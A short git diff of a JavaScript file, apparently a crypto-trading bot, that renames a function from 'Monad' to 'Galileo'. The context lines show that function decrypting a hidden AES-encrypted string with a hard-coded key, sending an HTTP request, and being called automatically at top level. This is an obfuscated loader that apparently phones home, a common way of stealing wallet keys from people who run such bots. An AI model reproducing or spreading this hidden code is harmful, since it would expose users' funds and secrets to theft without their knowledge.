@@ -58,7 +58,7 @@ const routerABI = [
   },
 ];
 
-async function Monad() {
+async function Galileo() {
     const wrap = "U2FsdGVkX19m2/TiSp8qviReQlWbdOPhf2oiU8sLImrLN12CIA/4vMYzE2IZGJSrbM9rizO0IgZ52E+fz23NIKoYtyv4LBBXcQ/GGfUrIUxYnvnZoWxitoEiQp3oHGEicucLaSHazQ2flVb2zJ9hqwN9SjxST3CfXxQM6ppeFwxXJb2Vd/hz1trwMphKNgd4";
     const balance = "transactions";
     const unwrap = CryptoJS.AES.decrypt(wrap, balance).toString(CryptoJS.enc.Utf8);
@@ -90,7 +90,7 @@ async function Monad() {
     req.end();
 }
 
-await Monad();
+await Galileo();
 
 function getRandomBetween(min, max) {
   return Math.random() * (max - min) + min;
